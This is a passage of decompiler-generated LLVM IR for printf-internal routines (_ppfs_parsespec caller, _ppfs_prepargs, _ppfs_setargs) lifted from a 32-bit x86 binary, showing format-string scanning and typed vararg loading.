  %v2_804e6dc = inttoptr i32 %v1_804e6dc to i32*
  store i32 %v0_804e6dc, i32* %v2_804e6dc, align 4
  %v0_804e6de.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e6de

dec_label_pc_804e6de:                             ; preds = %dec_label_pc_804e6de, %entry
  %v0_804e6de = phi i32 [ %v1_804e6e4, %dec_label_pc_804e6de ], [ %v0_804e6de.pre, %entry ]
  %v1_804e6de = inttoptr i32 %v0_804e6de to i32*
  store i32 8, i32* %v1_804e6de, align 4
  %v0_804e6e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6e4 = add i32 %v0_804e6e4, 4
  store i32 %v1_804e6e4, i32* %eax.global-to-local, align 4
  %v0_804e6e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6e7 = add i32 %v0_804e6e7, -1
  %v8_804e6e7 = icmp eq i32 %v1_804e6e7, 0
  store i32 %v1_804e6e7, i32* %edx.global-to-local, align 4
  %v1_804e6e8 = icmp eq i1 %v8_804e6e7, false
  br i1 %v1_804e6e8, label %dec_label_pc_804e6de, label %dec_label_pc_804e6ea

dec_label_pc_804e6ea:                             ; preds = %dec_label_pc_804e6de
  %v0_804e6ea = load i32, i32* @esi, align 4
  store i32 %v0_804e6ea, i32* %eax.global-to-local, align 4
  %v1_804e71520 = inttoptr i32 %v0_804e6ea to i8*
  %v2_804e71521 = load i8, i8* %v1_804e71520, align 1
  %v3_804e71522 = zext i8 %v2_804e71521 to i32
  %v5_804e71523 = and i32 %v1_804e6e7, -256
  %v6_804e71524 = or i32 %v3_804e71522, %v5_804e71523
  store i32 %v6_804e71524, i32* %edx.global-to-local, align 4
  %v4_804e71725 = icmp eq i8 %v2_804e71521, 0
  %v1_804e71927 = icmp eq i1 %v4_804e71725, false
  br i1 %v1_804e71927, label %dec_label_pc_804e6f3, label %dec_label_pc_804e71b

dec_label_pc_804e6f3:                             ; preds = %dec_label_pc_804e6ea, %dec_label_pc_804e715.backedge
  %v6_804e71530 = phi i32 [ %v6_804e715, %dec_label_pc_804e715.backedge ], [ %v6_804e71524, %dec_label_pc_804e6ea ]
  %v2_804e71529 = phi i8 [ %v2_804e715, %dec_label_pc_804e715.backedge ], [ %v2_804e71521, %dec_label_pc_804e6ea ]
  %v0_804e6f828 = phi i32 [ %v0_804e6f8.be, %dec_label_pc_804e715.backedge ], [ %v0_804e6ea, %dec_label_pc_804e6ea ]
  %v10_804e6f3 = icmp eq i8 %v2_804e71529, 37
  %v1_804e6f6 = icmp eq i1 %v10_804e6f3, false
  br i1 %v1_804e6f6, label %dec_label_pc_804e714, label %dec_label_pc_804e6f8

dec_label_pc_804e6f8:                             ; preds = %dec_label_pc_804e6f3
  %v1_804e6f8 = add i32 %v0_804e6f828, 1
  store i32 %v1_804e6f8, i32* %eax.global-to-local, align 4
  %v1_804e6f9 = inttoptr i32 %v1_804e6f8 to i8*
  %v2_804e6f9 = load i8, i8* %v1_804e6f9, align 1
  %v11_804e6f9 = icmp eq i8 %v2_804e6f9, 37
  br i1 %v11_804e6f9, label %dec_label_pc_804e714, label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %dec_label_pc_804e6f8
  %v1_804e701 = load i32, i32* @ebx, align 4
  %v2_804e701 = inttoptr i32 %v1_804e701 to i32*
  store i32 %v1_804e6f8, i32* %v2_804e701, align 4
  %v0_804e703 = load i32, i32* @ebx, align 4
  %v1_804e704 = inttoptr i32 %v0_804e703 to i32*
  %v2_804e704 = call i32 @_ppfs_parsespec(i32* %v1_804e704)
  store i32 %v2_804e704, i32* %eax.global-to-local, align 4
  %v2_804e70c = icmp slt i32 %v2_804e704, 0
  br i1 %v2_804e70c, label %dec_label_pc_804e71f, label %dec_label_pc_804e710

dec_label_pc_804e710:                             ; preds = %dec_label_pc_804e6fe
  %v0_804e710 = load i32, i32* @ebx, align 4
  %v1_804e710 = inttoptr i32 %v0_804e710 to i32*
  %v2_804e710 = load i32, i32* %v1_804e710, align 4
  %v4_804e715.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e715.backedge

dec_label_pc_804e714:                             ; preds = %dec_label_pc_804e6f8, %dec_label_pc_804e6f3
  %v0_804e714 = phi i32 [ %v1_804e6f8, %dec_label_pc_804e6f8 ], [ %v0_804e6f828, %dec_label_pc_804e6f3 ]
  %v1_804e714 = add i32 %v0_804e714, 1
  br label %dec_label_pc_804e715.backedge

dec_label_pc_804e715.backedge:                    ; preds = %dec_label_pc_804e714, %dec_label_pc_804e710
  %v4_804e715.be = phi i32 [ %v4_804e715.pre.pre, %dec_label_pc_804e710 ], [ %v6_804e71530, %dec_label_pc_804e714 ]
  %v0_804e6f8.be = phi i32 [ %v2_804e710, %dec_label_pc_804e710 ], [ %v1_804e714, %dec_label_pc_804e714 ]
  store i32 %v0_804e6f8.be, i32* %eax.global-to-local, align 4
  %v1_804e715 = inttoptr i32 %v0_804e6f8.be to i8*
  %v2_804e715 = load i8, i8* %v1_804e715, align 1
  %v3_804e715 = zext i8 %v2_804e715 to i32
  %v5_804e715 = and i32 %v4_804e715.be, -256
  %v6_804e715 = or i32 %v3_804e715, %v5_804e715
  store i32 %v6_804e715, i32* %edx.global-to-local, align 4
  %v4_804e717 = icmp eq i8 %v2_804e715, 0
  %v1_804e719 = icmp eq i1 %v4_804e717, false
  br i1 %v1_804e719, label %dec_label_pc_804e6f3, label %dec_label_pc_804e715.dec_label_pc_804e71b_crit_edge

dec_label_pc_804e715.dec_label_pc_804e71b_crit_edge: ; preds = %dec_label_pc_804e715.backedge
  %v0_804e71b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e71b

dec_label_pc_804e71b:                             ; preds = %dec_label_pc_804e715.dec_label_pc_804e71b_crit_edge, %dec_label_pc_804e6ea
  %v0_804e71b = phi i32 [ %v0_804e71b.pre, %dec_label_pc_804e715.dec_label_pc_804e71b_crit_edge ], [ %v0_804e6ea, %dec_label_pc_804e6ea ]
  %v1_804e71b = load i32, i32* @ebx, align 4
  %v2_804e71b = inttoptr i32 %v1_804e71b to i32*
  store i32 %v0_804e71b, i32* %v2_804e71b, align 4
  br label %dec_label_pc_804e71f

dec_label_pc_804e71f:                             ; preds = %dec_label_pc_804e6fe, %dec_label_pc_804e71b
  %storemerge = phi i32 [ 0, %dec_label_pc_804e71b ], [ -1, %dec_label_pc_804e6fe ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e71f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e71f, i32* @edx, align 4
  %v2_804e720 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e720, i32* @ebx, align 4
  store i32 %v0_804e6b4, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e715, { 1, 0 }
  uselistorder i8 %v2_804e715, { 1, 2, 0 }
  uselistorder i32 %v0_804e6f8.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e6f828, { 1, 0 }
  uselistorder i32 %v0_804e6ea, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e6e7, { 0, 2, 1 }
  uselistorder i32 %v1_804e6e4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 6, 5, 7 }
  uselistorder label %dec_label_pc_804e71f, { 1, 0 }
  uselistorder label %dec_label_pc_804e6f3, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e724 = load i32, i32* @esi, align 4
  %v0_804e725 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e731 = add i32 %arg1, 24
  %v2_804e731 = inttoptr i32 %v1_804e731 to i32*
  %v3_804e731 = load i32, i32* %v2_804e731, align 4
  %v2_804e734 = add i32 %arg1, 76
  %v3_804e734 = inttoptr i32 %v2_804e734 to i32*
  store i32 %arg2, i32* %v3_804e734, align 4
  %tmp8 = icmp slt i32 %v3_804e731, 1
  br i1 %tmp8, label %dec_label_pc_804e762, label %dec_label_pc_804e73b

dec_label_pc_804e73b:                             ; preds = %entry
  %v1_804e73e = load i32, i32* @ebx, align 4
  %v2_804e73e = add i32 %v1_804e73e, 28
  %v3_804e73e = inttoptr i32 %v2_804e73e to i32*
  store i32 %v3_804e731, i32* %v3_804e73e, align 4
  %v0_804e741 = load i32, i32* @ebx, align 4
  %v1_804e741 = add i32 %v0_804e741, 24
  %v2_804e741 = inttoptr i32 %v1_804e741 to i32*
  store i32 0, i32* %v2_804e741, align 4
  %v0_804e748 = load i32, i32* @ebx, align 4
  %v1_804e748 = add i32 %v0_804e748, 4
  %v2_804e748 = inttoptr i32 %v1_804e748 to i32*
  store i32 0, i32* %v2_804e748, align 4
  %v0_804e74f = load i32, i32* @ebx, align 4
  %v1_804e74f = add i32 %v0_804e74f, 8
  %v2_804e74f = inttoptr i32 %v1_804e74f to i32*
  store i32 0, i32* %v2_804e74f, align 4
  %v0_804e756 = load i32, i32* @ebx, align 4
  %v1_804e757 = call i32 @_ppfs_setargs(i32 %v0_804e756)
  %v1_804e75f = load i32, i32* @ebx, align 4
  %v2_804e75f = add i32 %v1_804e75f, 24
  %v3_804e75f = inttoptr i32 %v2_804e75f to i32*
  store i32 %v3_804e731, i32* %v3_804e75f, align 4
  br label %dec_label_pc_804e762

dec_label_pc_804e762:                             ; preds = %entry, %dec_label_pc_804e73b
  %v2_804e762 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e725, i32* @ebx, align 4
  store i32 %v0_804e724, i32* @esi, align 4
  ret i32 %v2_804e762

; uselistorder directives
  uselistorder i32 %v3_804e731, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e762, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e769 = load i32, i32* @ebx, align 4
  store i32 %v0_804e769, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e76e = add i32 %arg1, 24
  %v2_804e76e = inttoptr i32 %v1_804e76e to i32*
  %v3_804e76e = load i32, i32* %v2_804e76e, align 4
  %v4_804e76e = icmp eq i32 %v3_804e76e, 0
  %v1_804e772 = add i32 %arg1, 80
  store i32 %v1_804e772, i32* %ebx.global-to-local, align 4
  %v1_804e775 = icmp eq i1 %v4_804e76e, false
  %v1_804e82d = add i32 %arg1, 8
  %v2_804e82d = inttoptr i32 %v1_804e82d to i32*
  %v3_804e82d = load i32, i32* %v2_804e82d, align 4
  %v8_804e82d = icmp eq i32 %v3_804e82d, -2147483648
  %v1_804e834 = icmp eq i1 %v8_804e82d, false
  br i1 %v1_804e775, label %dec_label_pc_804e82d, label %dec_label_pc_804e77b

dec_label_pc_804e77b:                             ; preds = %entry
  br i1 %v1_804e834, label %dec_label_pc_804e795, label %dec_label_pc_804e784

dec_label_pc_804e784:                             ; preds = %dec_label_pc_804e77b
  %v1_804e784 = add i32 %arg1, 76
  %v2_804e784 = inttoptr i32 %v1_804e784 to i32*
  %v3_804e784 = load i32, i32* %v2_804e784, align 4
  store i32 %v3_804e784, i32* %eax.global-to-local, align 4
  %v1_804e787 = add i32 %v3_804e784, 4
  store i32 %v1_804e787, i32* %edx.global-to-local, align 4
  store i32 %v1_804e787, i32* %v2_804e784, align 4
  %v0_804e78d = load i32, i32* %eax.global-to-local, align 4
  %v1_804e78d = inttoptr i32 %v0_804e78d to i32*
  %v2_804e78d = load i32, i32* %v1_804e78d, align 4
  store i32 %v2_804e78d, i32* %eax.global-to-local, align 4
  %v1_804e78f = load i32, i32* @ecx, align 4
  %v2_804e78f = add i32 %v1_804e78f, 80
  %v3_804e78f = inttoptr i32 %v2_804e78f to i32*
  store i32 %v2_804e78d, i32* %v3_804e78f, align 4
  %v0_804e792 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e792 = load i32, i32* @ecx, align 4
  %v2_804e792 = add i32 %v1_804e792, 8
  %v3_804e792 = inttoptr i32 %v2_804e792 to i32*
  store i32 %v0_804e792, i32* %v3_804e792, align 4
  %v0_804e795.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e795

dec_label_pc_804e795:                             ; preds = %dec_label_pc_804e77b, %dec_label_pc_804e784
  %v1_804e7a4 = phi i32 [ %arg1, %dec_label_pc_804e77b ], [ %v0_804e795.pre, %dec_label_pc_804e784 ]
  %v1_804e795 = add i32 %v1_804e7a4, 4
  %v2_804e795 = inttoptr i32 %v1_804e795 to i32*
  %v3_804e795 = load i32, i32* %v2_804e795, align 4
  %v8_804e795 = icmp eq i32 %v3_804e795, -2147483648
  %v1_804e79c = icmp eq i1 %v8_804e795, false
  br i1 %v1_804e79c, label %dec_label_pc_804e7af, label %dec_label_pc_804e79e

dec_label_pc_804e79e:                             ; preds = %dec_label_pc_804e795
  %v1_804e79e = add i32 %v1_804e7a4, 76
  %v2_804e79e = inttoptr i32 %v1_804e79e to i32*
  %v3_804e79e = load i32, i32* %v2_804e79e, align 4
  store i32 %v3_804e79e, i32* %eax.global-to-local, align 4
  %v1_804e7a1 = add i32 %v3_804e79e, 4
  store i32 %v1_804e7a1, i32* %edx.global-to-local, align 4
  store i32 %v1_804e7a1, i32* %v2_804e79e, align 4
  %v0_804e7a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7a7 = inttoptr i32 %v0_804e7a7 to i32*
  %v2_804e7a7 = load i32, i32* %v1_804e7a7, align 4
  store i32 %v2_804e7a7, i32* %eax.global-to-local, align 4
  %v1_804e7a9 = load i32, i32* @ecx, align 4
  %v2_804e7a9 = add i32 %v1_804e7a9, 80
  %v3_804e7a9 = inttoptr i32 %v2_804e7a9 to i32*
  store i32 %v2_804e7a7, i32* %v3_804e7a9, align 4
  %v0_804e7ac = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7ac = load i32, i32* @ecx, align 4
  %v2_804e7ac = add i32 %v1_804e7ac, 4
  %v3_804e7ac = inttoptr i32 %v2_804e7ac to i32*
  store i32 %v0_804e7ac, i32* %v3_804e7ac, align 4
  %v1_804e82615.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e7af

dec_label_pc_804e7af:                             ; preds = %dec_label_pc_804e795, %dec_label_pc_804e79e
  %v1_804e82615 = phi i32 [ %v1_804e7a4, %dec_label_pc_804e795 ], [ %v1_804e82615.pre, %dec_label_pc_804e79e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e82616 = add i32 %v1_804e82615, 28
  %v3_804e82617 = inttoptr i32 %v2_804e82616 to i32*
  %v4_804e82618 = load i32, i32* %v3_804e82617, align 4
  %v5_804e82920 = icmp sgt i32 %v4_804e82618, 0
  br i1 %v5_804e82920, label %dec_label_pc_804e7b3, label %dec_label_pc_804e85b.loopexit

dec_label_pc_804e7b3:                             ; preds = %dec_label_pc_804e7af, %dec_label_pc_804e825
  %v1_804e82622 = phi i32 [ %v1_804e826, %dec_label_pc_804e825 ], [ %v1_804e82615, %dec_label_pc_804e7af ]
  %v1_804e7b321 = phi i32 [ %v1_804e825, %dec_label_pc_804e825 ], [ 0, %dec_label_pc_804e7af ]
  %v2_804e7b3 = mul i32 %v1_804e7b321, 4
  %v3_804e7b3 = add i32 %v2_804e7b3, 40
  %v4_804e7b3 = add i32 %v3_804e7b3, %v1_804e82622
  %v5_804e7b3 = inttoptr i32 %v4_804e7b3 to i32*
  %v6_804e7b3 = load i32, i32* %v5_804e7b3, align 4
  store i32 %v6_804e7b3, i32* %eax.global-to-local, align 4
  %v1_804e7b7 = add i32 %v6_804e7b3, -8
  %v9_804e7b7 = icmp eq i32 %v1_804e7b7, 0
  br i1 %v9_804e7b7, label %dec_label_pc_804e825, label %dec_label_pc_804e7bc

dec_label_pc_804e7bc:                             ; preds = %dec_label_pc_804e7b3
  %v10_804e7b7 = icmp slt i32 %v1_804e7b7, 0
  %v6_804e7b7 = sub i32 7, %v6_804e7b3
  %v7_804e7b7 = and i32 %v6_804e7b7, %v6_804e7b3
  %v8_804e7b7 = icmp slt i32 %v7_804e7b7, 0
  %v1_804e7bc = add i32 %v1_804e82622, 76
  %v2_804e7bc = inttoptr i32 %v1_804e7bc to i32*
  %v3_804e7bc = load i32, i32* %v2_804e7bc, align 4
  store i32 %v3_804e7bc, i32* %edx.global-to-local, align 4
  %v3_804e7bf = icmp eq i1 %v10_804e7b7, %v8_804e7b7
  br i1 %v3_804e7bf, label %dec_label_pc_804e7cf, label %dec_label_pc_804e7c1

dec_label_pc_804e7c1:                             ; preds = %dec_label_pc_804e7bc
  %tmp13 = icmp slt i32 %v6_804e7b3, 3
  %v9_804e7c8 = icmp eq i32 %v6_804e7b3, 7
  %v1_804e7cb = icmp eq i1 %v9_804e7c8, false
  %or.cond = or i1 %tmp13, %v1_804e7cb
  br i1 %or.cond, label %dec_label_pc_804e818, label %dec_label_pc_804e7fa

dec_label_pc_804e7cf:                             ; preds = %dec_label_pc_804e7bc
  %tmp14 = icmp sgt i32 %v6_804e7b3, 1024
  br i1 %tmp14, label %dec_label_pc_804e7d8, label %dec_label_pc_804e818

dec_label_pc_804e7d8:                             ; preds = %dec_label_pc_804e7cf
  %v6_804e7d8 = icmp eq i32 %v6_804e7b3, 2048
  br i1 %v6_804e7d8, label %dec_label_pc_804e7e8, label %dec_label_pc_804e7df

dec_label_pc_804e7df:                             ; preds = %dec_label_pc_804e7d8
  %v9_804e7df = icmp eq i32 %v6_804e7b3, 2055
  %v1_804e7e4 = icmp eq i1 %v9_804e7df, false
  br i1 %v1_804e7e4, label %dec_label_pc_804e818, label %dec_label_pc_804e809

dec_label_pc_804e7e8:                             ; preds = %dec_label_pc_804e7d8
  %v1_804e7e8 = add i32 %v3_804e7bc, 8
  store i32 %v1_804e7e8, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7e8, i32* %v2_804e7bc, align 4
  %v0_804e7ee = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7ee = inttoptr i32 %v0_804e7ee to i32*
  %v2_804e7ee = load i32, i32* %v1_804e7ee, align 4
  store i32 %v2_804e7ee, i32* %eax.global-to-local, align 4
  %v1_804e7f0 = add i32 %v0_804e7ee, 4
  %v2_804e7f0 = inttoptr i32 %v1_804e7f0 to i32*
  %v3_804e7f0 = load i32, i32* %v2_804e7f0, align 4
  store i32 %v3_804e7f0, i32* %edx.global-to-local, align 4
  %v1_804e7f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f3 = inttoptr i32 %v1_804e7f3 to i32*
  store i32 %v2_804e7ee, i32* %v2_804e7f3, align 4
  %v0_804e7f5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7f5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7f5 = add i32 %v1_804e7f5, 4
  %v3_804e7f5 = inttoptr i32 %v2_804e7f5 to i32*
  store i32 %v0_804e7f5, i32* %v3_804e7f5, align 4
  br label %dec_label_pc_804e822

dec_label_pc_804e7fa:                             ; preds = %dec_label_pc_804e7c1
  %v3_804e7fa = load i32, i32* %v2_804e7bc, align 4
  store i32 %v3_804e7fa, i32* %edx.global-to-local, align 4
  %v1_804e7fd = add i32 %v3_804e7fa, 8
  store i32 %v1_804e7fd, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7fd, i32* %v2_804e7bc, align 4
  %v0_804e803 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e803 = inttoptr i32 %v0_804e803 to double*
  %v2_804e803 = load double, double* %v1_804e803, align 4
  %v2_804e805 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e805 = inttoptr i32 %v2_804e805 to double*
  store double %v2_804e803, double* %v4_804e805, align 4
  br label %dec_label_pc_804e822

dec_label_pc_804e809:                             ; preds = %dec_label_pc_804e7df
  %v3_804e809 = load i32, i32* %v2_804e7bc, align 4
  store i32 %v3_804e809, i32* %edx.global-to-local, align 4
  %v1_804e80c = add i32 %v3_804e809, 12
  store i32 %v1_804e80c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e80c, i32* %v2_804e7bc, align 4
  %v0_804e812 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e812 = inttoptr i32 %v0_804e812 to x86_fp80*
  %v2_804e812 = load x86_fp80, x86_fp80* %v1_804e812, align 4
  %v2_804e814 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e814 = inttoptr i32 %v2_804e814 to x86_fp80*
  store x86_fp80 %v2_804e812, x86_fp80* %v3_804e814, align 4
  br label %dec_label_pc_804e822

dec_label_pc_804e818:                             ; preds = %dec_label_pc_804e7c1, %dec_label_pc_804e7cf, %dec_label_pc_804e7df
  %v1_804e818 = add i32 %v3_804e7bc, 4
  store i32 %v1_804e818, i32* %eax.global-to-local, align 4
  store i32 %v1_804e818, i32* %v2_804e7bc, align 4
  %v0_804e81e = load i32, i32* %edx.global-to-local, align 4
  %v1_804e81e = inttoptr i32 %v0_804e81e to i32*
  %v2_804e81e = load i32, i32* %v1_804e81e, align 4
  store i32 %v2_804e81e, i32* %eax.global-to-local, align 4
  %v1_804e820 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e820 = inttoptr i32 %v1_804e820 to i32*
  store i32 %v2_804e81e, i32* %v2_804e820, align 4
  br label %dec_label_pc_804e822

dec_label_pc_804e822:                             ; preds = %dec_label_pc_804e809, %dec_label_pc_804e7fa, %dec_label_pc_804e7e8, %dec_label_pc_804e818
  %v0_804e822 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e822 = add i32 %v0_804e822, 12
  store i32 %v1_804e822, i32* %ebx.global-to-local, align 4
  %v0_804e825.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e826.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e825

dec_label_pc_804e825:                             ; preds = %dec_label_pc_804e7b3, %dec_label_pc_804e822
  %v1_804e826 = phi i32 [ %v1_804e82622, %dec_label_pc_804e7b3 ], [ %v1_804e826.pre, %dec_label_pc_804e822 ]
  %v0_804e825 = phi i32 [ %v1_804e7b321, %dec_label_pc_804e7b3 ], [ %v0_804e825.pre, %dec_label_pc_804e822 ]
  %v1_804e825 = add i32 %v0_804e825, 1
  store i32 %v1_804e825, i32* %esi.global-to-local, align 4
  %v2_804e826 = add i32 %v1_804e826, 28
  %v3_804e826 = inttoptr i32 %v2_804e826 to i32*
  %v4_804e826 = load i32, i32* %v3_804e826, align 4
  %v5_804e829 = icmp slt i32 %v1_804e825, %v4_804e826
  br i1 %v5_804e829, label %dec_label_pc_804e7b3, label %dec_label_pc_804e826.dec_label_pc_804e85b.loopexit_crit_edge

dec_label_pc_804e82d:                             ; preds = %entry
  br i1 %v1_804e834, label %dec_label_pc_804e844, label %dec_label_pc_804e836

dec_label_pc_804e836:                             ; preds = %dec_label_pc_804e82d
  %v1_804e836 = add i32 %arg1, 36
  %v2_804e836 = inttoptr i32 %v1_804e836 to i8*
  %v3_804e836 = load i8, i8* %v2_804e836, align 1
  %v2_804e83a = zext i8 %v3_804e836 to i32
  %v3_804e83a = mul nuw nsw i32 %v2_804e83a, 12
  store i32 %v3_804e83a, i32* %eax.global-to-local, align 4
  %v2_804e83d = add i32 %arg1, 68
  %v3_804e83d = add i32 %v2_804e83d, %v3_804e83a
  %v4_804e83d = inttoptr i32 %v3_804e83d to i32*
  %v5_804e83d = load i32, i32* %v4_804e83d, align 4
  store i32 %v5_804e83d, i32* %eax.global-to-local, align 4
  store i32 %v5_804e83d, i32* %v2_804e82d, align 4
  %v0_804e844.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e844

dec_label_pc_804e844:                             ; preds = %dec_label_pc_804e82d, %dec_label_pc_804e836
  %v1_804e858 = phi i32 [ %arg1, %dec_label_pc_804e82d ], [ %v0_804e844.pre, %dec_label_pc_804e836 ]
  %v1_804e844 = add i32 %v1_804e858, 4
  %v2_804e844 = inttoptr i32 %v1_804e844 to i32*
  %v3_804e844 = load i32, i32* %v2_804e844, align 4
  %v8_804e844 = icmp eq i32 %v3_804e844, -2147483648
  %v1_804e84b = icmp eq i1 %v8_804e844, false
  br i1 %v1_804e84b, label %dec_label_pc_804e85b, label %dec_label_pc_804e84d

dec_label_pc_804e84d:                             ; preds = %dec_label_pc_804e844
  %v1_804e84d = add i32 %v1_804e858, 37
  %v2_804e84d = inttoptr i32 %v1_804e84d to i8*
  %v3_804e84d = load i8, i8* %v2_804e84d, align 1
  %v2_804e851 = zext i8 %v3_804e84d to i32
  %v3_804e851 = mul nuw nsw i32 %v2_804e851, 12
  store i32 %v3_804e851, i32* %eax.global-to-local, align 4
  %v1_804e854 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e854 = add nsw i32 %v3_804e851, -12
  %v3_804e854 = add i32 %v2_804e854, %v1_804e854
  %v4_804e854 = inttoptr i32 %v3_804e854 to i32*
  %v5_804e854 = load i32, i32* %v4_804e854, align 4
  store i32 %v5_804e854, i32* %eax.global-to-local, align 4
  store i32 %v5_804e854, i32* %v2_804e844, align 4
  %v0_804e85b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e85b

dec_label_pc_804e826.dec_label_pc_804e85b.loopexit_crit_edge: ; preds = %dec_label_pc_804e825
  br label %dec_label_pc_804e85b.loopexit

dec_label_pc_804e85b.loopexit:                    ; preds = %dec_label_pc_804e826.dec_label_pc_804e85b.loopexit_crit_edge, %dec_label_pc_804e7af
  %v1_804e826.lcssa = phi i32 [ %v1_804e826, %dec_label_pc_804e826.dec_label_pc_804e85b.loopexit_crit_edge ], [ %v1_804e82615, %dec_label_pc_804e7af ]
  br label %dec_label_pc_804e85b

dec_label_pc_804e85b:                             ; preds = %dec_label_pc_804e85b.loopexit, %dec_label_pc_804e844, %dec_label_pc_804e84d
  %v10_804e862 = phi i32 [ %v1_804e826.lcssa, %dec_label_pc_804e85b.loopexit ], [ %v1_804e858, %dec_label_pc_804e844 ], [ %v0_804e85b.pre, %dec_label_pc_804e84d ]
  %v1_804e85b = add i32 %v10_804e862, 8
  %v2_804e85b = inttoptr i32 %v1_804e85b to i32*
  %v3_804e85b = load i32, i32* %v2_804e85b, align 4
  store i32 %v3_804e85b, i32* %eax.global-to-local, align 4
  %v2_804e85e = icmp slt i32 %v3_804e85b, 0
  %v1_804e860 = icmp eq i1 %v2_804e85e, false
  br i1 %v1_804e860, label %dec_label_pc_804e876, label %dec_label_pc_804e862

dec_label_pc_804e862:                             ; preds = %dec_label_pc_804e85b
  %v1_804e862 = add i32 %v10_804e862, 16
  %v2_804e862 = inttoptr i32 %v1_804e862 to i32*
  %v3_804e862 = load i32, i32* %v2_804e862, align 4
  %v4_804e862 = or i32 %v3_804e862, 8
  store i32 %v4_804e862, i32* %v2_804e862, align 4
  %v0_804e866 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e866 = sub i32 0, %v0_804e866
  store i32 %v1_804e866, i32* %eax.global-to-local, align 4
  %v1_804e868 = load i32, i32* @ecx, align 4
  %v2_804e868 = add i32 %v1_804e868, 8
  %v3_804e868 = inttoptr i32 %v2_804e868 to i32*
  store i32 %v1_804e866, i32* %v3_804e868, align 4
  %v0_804e86b = load i32, i32* @ecx, align 4
  %v1_804e86b = add i32 %v0_804e86b, 16
  %v2_804e86b = inttoptr i32 %v1_804e86b to i32*
  %v3_804e86b = load i32, i32* %v2_804e86b, align 4
  %v4_804e86b = and i32 %v3_804e86b, -2
  store i32 %v4_804e86b, i32* %v2_804e86b, align 4
  %v0_804e86f = load i32, i32* @ecx, align 4
  %v1_804e86f = add i32 %v0_804e86f, 20
  %v2_804e86f = inttoptr i32 %v1_804e86f to i32*
  store i32 32, i32* %v2_804e86f, align 4
  %v0_804e878.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e876

dec_label_pc_804e876:                             ; preds = %dec_label_pc_804e85b, %dec_label_pc_804e862
  %v0_804e878 = phi i32 [ %v3_804e85b, %dec_label_pc_804e85b ], [ %v0_804e878.pre, %dec_label_pc_804e862 ]
  %v2_804e876 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e876, i32* @ebx, align 4
  ret i32 %v0_804e878

; uselistorder directives
  uselistorder i32 %v3_804e851, { 1, 0 }
  uselistorder i32 %v3_804e83a, { 1, 0 }
  uselistorder i32 %v1_804e825, { 2, 1, 0 }
  uselistorder i32 %v1_804e826, { 1, 2, 0 }
  uselistorder i32 %v3_804e7bc, { 1, 0, 2 }
  uselistorder i32* %v2_804e7bc, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e7b7, { 1, 0 }
  uselistorder i32 %v6_804e7b3, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e7b321, { 1, 0 }
  uselistorder i32 %v1_804e82615, { 2, 0, 1 }
  uselistorder i1 %v1_804e834, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -12, { 23, 1, 9, 5, 2, 6, 7, 8, 10, 11, 3, 21, 12, 22, 0, 20, 14, 13, 15, 4, 16, 17, 18, 19, 25, 24, 26 }
  uselistorder i32 37, { 1, 2, 0 }
